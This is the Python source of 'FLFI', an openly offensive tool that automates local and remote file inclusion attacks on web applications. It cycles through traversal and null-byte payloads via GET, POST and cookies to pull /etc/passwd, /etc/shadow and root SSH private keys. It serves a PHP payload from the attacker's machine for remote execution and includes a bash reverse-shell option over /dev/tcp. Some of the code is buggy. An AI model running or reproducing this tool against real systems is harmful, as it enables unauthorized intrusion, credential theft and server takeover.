### FLFI - Find Local File Inclusion 
# Joshua Knox aka KNINJA
# Because the K is silent...like a ninja.
# October 2021
###

import argparse
import http.server
import socketserver
import subprocess
import sys
import threading
from time import sleep

version = "0.1.0"

# This little class cause the help  text to display if no params are given.
class MyParser(argparse.ArgumentParser):
    def error(self, message):
        print("")
        print("     ______ _      ______ _____ ")
        print("    |  ____| |    |  ____|_   _|")
        print("    | |__  | |    | |__    | |  ")
        print("    |  __| | |    |  __|   | |  ")
        print("    | |    | |____| |     _| |_ ")
        print("    |_|    |______|_|    |_____| verson " + version)
        print("\n      Find Local File Inclusion ")
        sys.stderr.write('\nERROR: %s\n\n' % message)
        self.print_help()
        sys.exit(2)

# Parse CLI parameters:
parser = MyParser()
parser.add_argument('-u', '--url', dest="url", required=True, type=str, \
    help="Provide a target URL. If you are testing specific params please use --param or --params ")

parser.add_argument('-f', '--file', dest="search_file", required=False, type=str, \
    help="File to be searched for, if not specified I will attempt to search from \
        a list of common files")

parser.add_argument('-d', '--param-data', dest="param_data", required=False, type=str, \
    help="Option if you want to define a param. THIS IS NOT NEEDED if you include ?<file>= in your url.")

parser.add_argument('-c', '--check', dest="check_str", required=False, type=str, \
    help="A unique string to help identify success.")

parser.add_argument('-C', '--cookie-only', dest="use_cookie_only", required=False, action='store_true', \
    help="USE ONLY COOKIE METHOD to attempt to use directory traversal, must supply the target cookie with -d or --params-data.")

parser.add_argument('--cookie-include', dest="use_cookie", required=False, action='store_true', \
    help="INCLUDE COOKIE METHOD to attempt to use directory traversal, must supply the target cookie with -d or --params-data.")

parser.add_argument('--folder', dest="folder", required=False, type=str, \
    help="Add a fold prefix to the traversal.")

parser.add_argument('-A', dest="all_methods", required=False, action='store_true',
    help="Adds uncommon traversal strings and all methods.")

parser.add_argument('-P', '--post-only', dest="use_post_only", required=False, action='store_true', \
    help="Chagne HTTP method to ONLY POST (Default is GET)")

parser.add_argument('--post-include', dest="use_post", required=False, action='store_true', \
    help="Chagne HTTP method to INCLUDE POST (Default is GET)")

parser.add_argument('-m', '--max', dest="max_depth", required=False, type=str, \
    help="Sets the max depth of traversal.(Default is 12)")

parser.add_argument('-o', '--print', dest="print_file", required=False, action='store_true',
    help="If files results are found print directly to terminal.")

# parser.add_argument('--apache2-4-49/50', dest="apache2-4-49", required=False, action='store_true',
#     help="Attempts to exploit apache2-4-49/50 CVE-2021-41773/42013")

parser.add_argument('--RCE', dest="rce", required=False, action='store_true',
    help="Will attempt RCE on target. Default is command is echo Hello FLFI!")

parser.add_argument('--RCE-basic-shell', dest="basic_shell", required=False, action='store_true',
    help="Execute basic reverse shell, MAKE SURE to start a listener on the same port you specified in --lport")

parser.add_argument('--lhost', dest="lhost", required=False, type=str, \
    help="Set the local host for RCE")

parser.add_argument('--lport', dest="lport", required=False, type=str, \
    help="Port for reverse shell")

parser.add_argument('--rport', dest="rport", required=False, type=str, \
    help="Port Target will use to connect to the local listener for shell.")

# Parse Args put new args ^^ above here! lol 
args = parser.parse_args()

class FLFI:
    def __init__(self, args):
        # ---> SO MANY VARs !! <---
        
        # These are common files to look for and a couple patterns(checks) to verify. 
        self.common_files=[ {
                "name": "/etc/passwd",
                "checks": ["root:x","/bin/bash"],
            },{
                "name": "/etc/profile",
                "checks": ["/etc/profile:", "PATH=" ],
            },{
                "name": "/etc/issue",
                "checks": ["LTS", "Ubuntu"],
            },{
                "name": "/proc/version",
                "checks": ["Linux version"],
            },{
                "name": "/etc/shadow",
                "checks": ["99999:7:::"],
            },{
                "name": "/root/.ssh/id_rsa",
                "checks": ["PRIVATE KEY"],
            }]

        # Set VARs from argparse
        self.url = args.url
        self.param_data = args.param_data
        self.use_all = args.all_methods
        self.folder = args.folder
        self.singular_search_file = args.search_file
        self.singular_search_check = args.check_str
        self.print_file = args.print_file
        self.lhost = args.lhost 
        self.lport = args.lport
        self.rport = args.rport
        self.rce = args.rce
        self.basic_shell = args.basic_shell
        self.max_depth=args.max_depth
        self.url = self.clean_url(args.url)
        
        
        # More VARs
        self.vuln_urls = []
        self.folders_to_check = ['/']
        self.http_methods = ['GET']

        if self.rce or (self.lhost and self.lport):
            self.rce = True
            self.http_methods = ['RCE']

        if (self.lhost and not self.lport) or (self.lport and not self.lhost):
            print("For RCE you must provide both LHOST and LPORT")
            sys.exit()
        
        if args.use_post_only:
            self.http_methods = ['POST']
        if args.use_post or args.all_methods:
            self.http_methods.append['POST']
        if args.use_cookie_only:
            self.http_methods = ['COOKIE']
        if args.use_cookie or args.all_methods:
            self.http_methods.append['COOKIE']
        if args.folder:
            self.folders_to_check = [ args.folder + '/' ]

        # Common Directory Traversal strings:
        self.dts=['../', '....//',]
        # Common and UNCOMMON strings:
        if args.all_methods:
            self.dts=['../', '....//','.%2e/','.%%32%65/']

        # Nullbyte strings:
        self.nbyte = ['','/.','%00']
        
        # VARs for Current State
        self.curr_url = ""
        self.curr_file = ""
        self.curr_trav_str = ""
        self.curr_null_byte = ""
        self.curr_http_method = ""
        self.curr_post_param = ""
        self.curr_folder = ""
        
        self.prev_len = 0
        self.curr_len = 0
        self.curr_interation = 0

        # Some helpful checks
        if not self.folder:
            self.folder = ''
        if not self.param_data:
            if "=" in self.url:
                self.param_data = self.url.split("?")[1].replace("=", "")
                self.url = self.url.split("?")[0]
            if "POST" in self.http_methods:
                print("To use the POST method you must provide a param using --param-data or include it in your url. For Example: 10.10.218.27/lab6.php?file=")
        if not self.max_depth:
            self.max_depth = 12
        if self.rce and not self.lhost:
            print("!! If RCE is set, LHOST needs to be set.")
            sys.exit()
        if self.singular_search_file and not self.singular_search_check:
            print("You privide both a search file: -f and a search check: -c if you want to search for a specific file")
            sys.exit()
        if self.singular_search_file and self.singular_search_check:
            self.common_files = [ {
                "name": self.singular_search_file,
                "checks": [self.singular_search_check],}]
        #self.rce_code = "<?php print exec('');?>"
        if self.rce:
            self.rce_code = "<?php print exec(\"echo 'Hello flfi!'\"); ?>"
        if self.basic_shell:
            ip = self.lhost + '/' + self.rport
            self.rce_code = """<?php exec("/bin/bash -c 'bash -i > /dev/tcp/""" + ip + """ 0>&1'"); ?>"""
        

    # ---> REAL FUNCTIONS START HERE:

    @staticmethod
    def display_banner():
        print("")
        print("     ______ _      ______ _____ ")
        print("    |  ____| |    |  ____|_   _|")
        print("    | |__  | |    | |__    | |  ")
        print("    |  __| | |    |  __|   | |  ")
        print("    | |    | |____| |     _| |_ ")
        print("    |_|    |______|_|    |_____| verson " + version)
        print("\n      Find Local File Inclusion \n")  
    
    # Check url for http prefix and check for proper format. 
    @staticmethod
    def clean_url(url):
        if url[0:4] != "http":
            url = "http://" + url
        return url

    def construct_url(self):
        if self.param_data:
            param = "?" + self.param_data + "="
        else:  
            param = ""
        if self.rce:
            url = (self.url + param).replace('//','/')
        else:
            url = (self.url + param + '/' + self.curr_folder).replace('//','/') + (self.curr_trav_str * self.curr_interation) + \
            self.curr_file[1:] + self.curr_null_byte
        self.prev_len = self.curr_len
        self.curr_len = len(url + (" " * 25))
        return url

    def construct_url_post(self):
        if "?" in self.url:
            url = self.url.split("?")[0]
            if not self.param_data:
                self.param_data = self.url.split("?")[1].replace("=", "")
        url = (self.url + '/' + self.curr_folder).replace('//','/') 
        self.curr_post_param = self.param_data + "=" + (self.curr_trav_str * self.curr_interation) + self.curr_file + self.curr_null_byte
        self.prev_len = self.curr_len
        self.curr_len = len(url + self.curr_post_param + (" " * 50))
        return url
    
    def dir_trav_curl(self, f):
        print("\n---> STARTING DIRECTORY TRAVERSAL and NULLBYTE CHECK USING CURL WITH GET METHOD <---\n") 
        self.curr_http_method = "GET"
        for folder in self.folders_to_check:
            for i in range(self.max_depth + 1):
                for sym in self.dts:
                    for nb in self.nbyte:
                        self.curr_folder = folder
                        self.curr_null_byte
                        self.curr_interation = i
                        self.curr_trav_str = sym
                        self.curr_null_byte = nb
                        self.curr_file = f['name']
                        self.curr_url = self.construct_url()
                        print(" " * self.prev_len, end='\r', flush=True)
                        if i == 0:
                            print("[-] TRYING: " + self.curr_url, end='\r', flush=True) 
                            r=subprocess.getoutput("curl -s " + self.curr_url)           
                        else:
                            print("[-] TRYING: " + self.curr_url, end='\r', flush=True) 
                            r=subprocess.getoutput("curl " + self.curr_url)
                        for check in f['checks']:
                            if check in r:
                                print(" " * self.prev_len, end='\r', flush=True)                  
                                return "Woot!"
        print("DONE" + (" " * self.prev_len))
        return 'I got nothing'

    def dir_trav_curl_post(self, f):
        print("\n---> STARTING DIRECTORY TRAVERSAL and NULLBYTE CHECK USING CURL WITH POST METHOD <---\n") 
        self.curr_http_method = "POST"
        for folder in self.folders_to_check:
            for i in range(self.max_depth + 1):
                for sym in self.dts:
                    for nb in self.nbyte:
                        self.curr_folder = folder
                        self.curr_null_byte
                        self.curr_interation = i
                        self.curr_trav_str = sym
                        self.curr_null_byte = nb
                        self.curr_file = f['name']
                        self.curr_url = self.construct_url_post()
                        print(" " * self.prev_len, end='\r', flush=True)
                        if i == 0:
                            print('[-] TRYING: curl -s -d "' + self.curr_post_param + '" -X POST ' + self.curr_url, end='\r', flush=True)
                            r=subprocess.getoutput('curl -s -d "' + self.curr_post_param + '" -X POST ' + self.curr_url)           
                        else:
                            print('[-] TRYING: curl -s -d "' + self.curr_post_param + '" -X POST ' + self.curr_url, end='\r', flush=True)
                            r=subprocess.getoutput('curl -s -d "' + self.curr_post_param + '" -X POST ' + self.curr_url) 
                        for check in f['checks']:
                            if check in r:
                                print((" " * self.prev_len), end='\r', flush=True)                  
                                return "Woot!"
        print("DONE" + (" " * self.prev_len))
        return 'I got nothing'

    def dir_trav_curl_cookie(self, f):
        print("\n---> STARTING DIRECTORY TRAVERSAL and NULLBYTE CHECK USING CURL WITH COOKIE METHOD <---\n") 
        self.curr_http_method = "COOKIE"
        for folder in self.folders_to_check:
            for i in range(self.max_depth + 1):
                for sym in self.dts:
                    for nb in self.nbyte:
                        self.curr_folder = folder
                        self.curr_null_byte
                        self.curr_interation = i
                        self.curr_trav_str = sym
                        self.curr_null_byte = nb
                        self.curr_file = f['name']
                        self.curr_url = self.construct_url_post()
                        print(" " * self.prev_len, end='\r', flush=True)
                        if i == 0:
                            print('[-] TRYING: curl -s ' + self.curr_url + ' --cookie "' + self.curr_post_param + '" --output -', end='\r', flush=True)
                            r=subprocess.getoutput('curl -s ' + self.curr_url + ' --cookie "' + self.curr_post_param + '" --output -')           
                        else:
                            print('[-] TRYING: curl -s ' + self.curr_url + ' --cookie "' + self.curr_post_param + '" --output -', end='\r', flush=True)
                            r=subprocess.getoutput('curl -s ' + self.curr_url + ' --cookie "' + self.curr_post_param + '" --output -') 
                        for check in f['checks']:
                            if check in r:
                                print((" " * self.prev_len) , end='\r', flush=True)                  
                                return "Woot!"
        print("DONE" + (" " * self.prev_len))
        return 'I got nothing'
    
    def check_all_files_curl(self):
        for f in self.common_files:
            self.curr_file = f['name']
            self.curr_url = self.construct_url()
            r=subprocess.getoutput("curl -s " + self.curr_url)
            for check in f['checks']:
                if check in r:
                    print("--------------------------------------------------------------------------------------------")
                    print("[+] FOUND " + self.curr_file + " at: " + self.curr_url + "\n")
                    print("[+] USE 'curl -s " + self.curr_url + "' to get file directly.")
                    print("--------------------------------------------------------------------------------------------\n")
                    if self.print_file:
                        print(r)
                    break
        sys.exit()
    
    def check_all_files_curl_post(self):
        for f in self.common_files:
            self.curr_file = f['name']
            self.curr_url  = self.construct_url_post()
            r=subprocess.getoutput('curl -s -d "' + self.curr_post_param + '" -X POST ' + self.curr_url)
            for check in f['checks']:
                if check in r:
                    print("--------------------------------------------------------------------------------------------")
                    print("[+] FOUND " + self.curr_file + " at: " + self.curr_url + " with POST " + self.curr_post_param + "\n")
                    print('[+] USE curl -s -d "' + self.curr_post_param + '" -X POST ' + self.curr_url)
                    print("--------------------------------------------------------------------------------------------\n")
                    if self.print_file:
                        print(r)
                    break
        sys.exit()
    
    def check_all_files_curl_cookie(self):
        for f in self.common_files:
            self.curr_file = f['name']
            self.curr_url  = self.construct_url_post()
            r=subprocess.getoutput('curl -s ' + self.curr_url + ' --cookie "' + self.curr_post_param + '" --output -')
            for check in f['checks']:
                if check in r:
                    print("--------------------------------------------------------------------------------------------")
                    print("[+] FOUND " + self.curr_file + " at: " + self.curr_url + " with POST " + self.curr_post_param + "\n")
                    print('[+] USE curl -s ' + self.curr_url + ' --cookie "' + self.curr_post_param + '" --output -')
                    print("--------------------------------------------------------------------------------------------\n")
                    if self.print_file:
                        print(r)
                    break
        sys.exit()

    def start_http_server(self):
        handler = http.server.SimpleHTTPRequestHandler
        with socketserver.TCPServer(("", int(self.lport)), handler) as httpd:
            print("Server started at localhost:" + str(self.lport))
            httpd.serve_forever()


    def try_rce(self):
        print("\n---> ATTEMPTING RCE <---\n") 
        t1 = threading.Thread(target=self.start_http_server, daemon=True).start()
        sleep(3)
        with open('cmd.txt', 'w') as f:
            f.truncate(0)
            f.write(self.rce_code)
        self.curr_url = self.construct_url()
        #print("curl -s " + self.curr_url + "http://" + self.lhost + ":" + str(self.lport) + "/cmd.txt")
        r=subprocess.getoutput("curl -s " + self.curr_url + "http://" + self.lhost + ":" + str(self.lport) + "/cmd.txt")
        if "Hello flfi" in r:
            print("--------------------------------------------------")
            print("[+] EXECUTED cmd.txt " + self.rce_code + "\n")
            print("[+] USE curl -s " + self.curr_url + "http://" + self.lhost + ":" + str(self.lport) + "/cmd.txt")
            print("--------------------------------------------------\n")
            if self.print_file:
                print(r)
        
        sys.exit()


lfi= FLFI(args)
lfi.display_banner()
for f in lfi.common_files:
    if 'GET' in lfi.http_methods:
        answer = lfi.dir_trav_curl(f)
        if answer != "I got nothing":
            lfi.check_all_files_curl()
    if 'POST' in lfi.http_methods:
        answer = lfi.dir_trav_curl_post(f)
        if answer != "I got nothing":
            lfi.check_all_files_curl_post()
    if 'COOKIE' in lfi.http_methods:
        answer = lfi.dir_trav_curl_cookie(f)
        if answer != "I got nothing":
            lfi.check_all_files_curl_cookie()
    if 'RCE' in lfi.http_methods:
        lfi.try_rce()

    